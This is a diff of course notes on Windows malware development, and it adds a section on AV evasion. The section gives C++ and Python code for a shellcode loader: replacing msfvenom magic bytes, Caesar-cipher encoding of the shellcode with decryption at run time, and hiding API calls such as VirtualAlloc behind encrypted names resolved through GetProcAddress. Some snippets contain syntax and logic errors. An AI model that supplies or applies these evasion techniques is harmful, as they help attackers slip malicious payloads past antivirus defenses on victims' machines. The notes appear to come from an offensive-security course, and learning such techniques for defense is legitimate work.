@@ -1,13 +1,10 @@
------
-description: Notes from Dahvid Schloss's Course
------
-
 # Windows Malware Development
 
 This course aims to outline the basics of Malware Development for Windows.
 C2 frameworks are covered as well as writing shellcode in Cpp.
 
 ## C2 Review
+
 There are two major categories of C2: Synchronous and Asynchronous.
 
 SynC2 are continuous connections. Metasploit is a SynC2, and so is SSH.
@@ -30,6 +27,7 @@ According to their [github.io](https://mythicmeta.github.io/overview/) it looks
 like only a couple agents are still being worked on reliably.
 
 ## Building Shellcode Loaders
+
 It's important to know that regular programs and malware operate the same way.
 They both need three things:
 
@@ -120,6 +118,7 @@ is killed. This can be set to infinity, however. We can do this in a number of w
 `WaitForSingleObject(thread, -1);` is easy enough.
 
 ## First Malware
+
 This section is separate simply for ease of access. Following this paragraph will be a simple shellcode
 loader and a description of what it does:
 
@@ -145,3 +144,310 @@ int main()
 }
 ```
 
+## Basic Obfuscation
+
+AV faces a number of limitations in the form of UX and network load. By unpacking and sandboxing everything
+that runs on any given machine, end user activity is slowed down. Because of this, AV uses heuristic 
+analysis to speed up the scanning and quarantining process. These could include, but are not limited to:
+
+* Checking character buffers for known malicious strings
+* Using an `objdump` or `procmon`-like utility to check function calls without executing the file
+* Quickly sandboxing the executable to check for outbound connections
+
+Basic AV is typically limited to these heuristics only. Enterprise AV/EDR has ML involved that
+requires another course, so this will only cover entry/consumer AV.
+
+_msfvenom prints 4 magic bytes at the start of every payload it generates_. These bytes are 
+`fc4883e4` and they are a smoking gun for AV detections, especially when you also have an IP 
+address in the shellcode as well.
+
+There are a few basic things we can do to bypass these detections, though. They are simple:
+
+* Convert strings to hex (will only defeat very basic AV and AMSI)
+* String/Character replacements
+* Concatenation
+* Basic encoding/encryption
+
+Let's examine each of these one by one:
+
+### Character Replacement
+
+Typically, static analysis will capture and alert on strings of characters,
+like the Metasploit magic bytes `fc4883e4`. You can simply store the magic
+bytes elsewhere in another variable and insert 4 junk bytes into the start
+of the payload buffer. When we execute, the 4 magic bytes needed to run
+the payload will replace the 4 junk bytes at the start of the buffer
+using something like `memcpy` or `RtlMoveMemory`:
+
+```c++
+void RtlMoveMemory(
+    void*       Destination,
+    const void* Source,
+    size_t      Length
+);
+
+unsigned char buf[] = "shellcode";
+char replace[] = "/xfc/x48/x83/xe4";
+
+memcpy(buf,replace,4);
+```
+
+In the above example, our magic bytes are in `replace` but the
+buffer is clean. Static analysis tools will not generally alert
+on this because they generally search for patterns in contiguous
+memory, but do not have the resources to track how different bytes
+might be combined at runtime.
+
+### Basic Encryption
+
+Using something like ROT47 or a Caesar Cipher is a much
+easier way to eliminate malicious strings from your code.
+Using modulo math, you can manipulate bytes in Base 16 without
+having your values go over 255. We'll look into this in the next
+section where we build an obfuscator in Python.
+
+### Python Obfuscator
+
+Here we go...
+
+```Python
+import sys
+
+offset = 0 # woo, woo, woo, woo, woo! rackaids on rackaids...
+
+# Very step-by-step Caesar Cipher function.
+def cc(shellfile):
+    counter = 1
+    byte = ''
+    encoded_shellcode = ''
+    # The following variables strip characters step-by-step so it's 
+    # easier to see what is being removed.
+    strep = shellfile.replace("unsigned char buf[] = ", "") # leaves only bytes
+    nlstrip = strep.replace("\n", "") 
+    semistrip = nlstrip.replace(";", "")
+    quotestrip = semistrip.replace('"', "")
+    slashstrip = quotestrip.replace("\\", "")
+    shell_hex = slashstrip.replace("x", "")
+
+    # Iterate through code and encrypt
+    for i in shell_hex:
+        if(counter % 2 == 0):
+            byte = byte + i
+            byte = int(byte, 16)
+            byte = int(byte + offset)
+            byte = int(byte % 256) # 255 in C, C++
+            byte = hex(byte)[2:] # Revert to Hex, strip '0x'
+            if(len(byte) == 1):
+                byte = '0' + byte # append 0 to single digit hex vals
+            byte = "\\" + byte # reappend backslash
+            encoded_shellcode = encoded_shellcode + byte
+            byte = ''
+        else:
+            byte = byte + i
+        counter += 1
+    encoded_shellcode = encoded_shellcode
+    return encoded_shellcode
+
+# reinsert newlines and unsigned char declaration
+# after encryption
+def format_text(string, every=60)
+    lines = []
+    lines.append("unsigned char notbuf[] = ") # 'buf' alerts AV, so change it
+    for i in range(0, len(string), every):
+        lines.append("\"" + string[i:i+every] + "\"")
+    return '\n'.join(lines)
+
+
+def main():
+    try:
+        shellfile = open(sys.argv[1], "r").read()
+    except:
+        print("Input File Required. Usage: %s <filename>" %sys.argv[0])
+        sys.exit()
+    
+    enc_text = cc(shellfile)
+    print(format_text(enc_text))
+
+main()
+```
+
+Now that we have this working encryption script, we can take the
+output and paste it into our basic malware cpp file created previously.
+After swapping out all instances of `buf` to our new, stealhy `notbuf`,
+we have to implement decryption inside the script by adding the following
+lines after our `execute` var and before we call `RtlMoveMemory`:
+
+```c++
+int offset = 322; // or whatever your offset is
+int i = 0; // for byte counting
+do {
+    notbuf[i] = (int(notbuf[i]) - offset % 255);
+    i++;
+} while (i < (sizeof(notbuf) - 1 ));
+```
+
+### Function Obfuscation
+
+The malicious code is hidden via encryption, but the functions are not.
+This means that utilities like `objdump` are still going to flag the
+script because they know we are using a likely malicious combination
+of function calls.
+
+We can hide the functions by naming them something else or calling them
+via a global function. Let's look at `VirtualAlloc` for example. We can 
+abstract the functionality of `VirtualAlloc` using the following C++:
+
+```c++
+typedef LPVOID(WINAPI* VA)(
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flNewProtect,
+    DWORD   flProtect
+);
+```
+
+We can then call this using `GetProcAddress` and `GetModuleHandleA` to help
+the program understand that we are trying to call `VirtualAlloc` in an
+abstracted fashion. `GetProcAddress` gets a function name from a DLL or
+variable while `GetModuleHandleA` retrieves the Handle for a specific
+module or DLL. It would look like this:
+
+```c++
+// Initialize a function to get VirtualAlloc from kernel32
+VA vainit = (VA) GetProcAddress(GetModuleHandleA(kernel32), VirtualAlloc);
+
+// call VirtualAlloc via a different function name
+vainit(0, payload_length, MEM_COMMIT | MEM_RESERVE, 0x40);
+```
+
+This will remove `VirtualAlloc` from the import table, but will
+now make it detectable in `strings`. To bypass this, we can convert
+the function name to hex and encode it with a basic cipher. This
+is all the obfuscation we would need to avoid basic static analysis.
+Let's try it:
+
+```Python
+import sys
+
+offset = 0
+
+def cc(input):
+    counter = 0
+    byte = ''
+    encoded_shellcode = ''
+    try:
+        shell_hex = input.replace("unsigned char buf[] = ", "").translate(str.maketrans("", "", '"\n;\\x'))
+    except:
+        shell_hex = input # Leave it alone if it's right.
+    
+    for i in shell_hex:
+        if(counter % 2 == 0):
+            byte = byte + i
+            byte = int(byte, 16)
+            byte = int(byte + offset)
+            byte = int(byte % 256) # 255 in C, C++
+            byte = hex(byte)[2:] # Revert to Hex, strip '0x'
+            if(len(byte) == 1):
+                byte = '0' + byte # append 0 to single digit hex vals
+            byte = "\\" + byte # reappend backslash
+            encoded_shellcode = encoded_shellcode + byte
+            byte = ''
+        else:
+            byte = byte + i
+        counter += 1
+    encoded_shellcode = encoded_shellcode
+    return encoded_shellcode
+
+def format_text(string, every=60)
+    lines = []
+    lines.append("unsigned char notbuf[] = ") # 'buf' alerts AV, so change it
+    for i in range(0, len(string), every):
+        lines.append("\"" + string[i:i+every] + "\"")
+    return '\n'.join(lines)
+
+def string2hex(string):
+    plaintext = string.encode('utf-8')
+    hexstring = plaintext.hex()
+    return hexstring
+
+def main():
+    strval = sys.argv[1]
+    shell = string2hex(strval)
+    enc_txt = cc(shell)
+    print(format_text(enc_txt))
+
+main()
+```
+
+This code is pretty much identical to the other caesar cipher
+script we made except you give it a string instead of a filename.
+
+We can now append the following into our malware's main function:
+
+```c++
+char va[] = "encoded hex"; // VirtualAlloc Encrypted
+char ct[] = "encoded hex"; // CreateThread Encrypted
+char mvm[] = "encoded hex"; // RtlMoveMem Encrypted
+char kl32[] = "encoded hex"; // kernel32 Encrypted
+```
+
+These are variables for the encrypted function names we are using in our
+malware. Each of these needs a typedef function to be written outside of
+our main function:
+
+```c++
+typedef LPVOID(WINAPI* VA)(
+    LPVOID  lpAddress,
+    SIZE_T  dwSize,
+    DWORD   flNewProtect,
+    DWORD   flProtect
+);
+
+typedef VOID(WINAPI* MVM)(
+    VOID UNALIGNED*         Destination,
+    const VOID UNALIGNED*   Source,
+    SIZE_T                  Length,
+);
+
+typedef HANDLE(WINAPI* CT)(
+    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+    SIZE_T                  dwStackSize,
+    LPTHREAD_START_ROUTINE  lpStartAddress,
+    _drv_aliasesMem LPVOID  lpParameters,
+    DWORD                   dwCreationFlags,
+    LPDWORD                 lpThreadId
+);
+
+void Caesar(char* data, size_t data_len, int offset){
+    int i = 0;
+    do {
+        data[i] = (int(data[i]) - offset % 255);
+        i++;
+    } while (i < data_len);
+}
+```
+
+Now that we have our Caesar cipher and our typedefs, each
+encrypted function name must be iteratively decrypted and called
+to run the malware:
+
+```c++
+char kl32[] = "encoded hex";
+Caesar((char*)kl32, strlen(kl32), 322);
+char va[] = "encoded hex";
+Caesar((char*)va, strlen(va), 322);
+VA vainit = (VA) GetProcAddress(GetModuleHandleA(kl32), va);
+execute = vainit(0, notbuf_len, MEM_COMMIT | MEM_RESERVE, 0x40);
+// etc. etc. for all functions
+```
+
+Using this coding style, we can decrypt things as we need them
+and use them in time:
+
+```c++
+Caesar((char*)notbuf, notbuf_len, 322);
+char mvm[] = "encoded hex";
+Caesar((char*)mvm, strlen(mvm), 322);
+MVM mvminit = (MVM) GetProcAddress(GetModuleHandleA(kl32), mvm);
+mvminit(execute, notbuf, notbuf_len);
+```
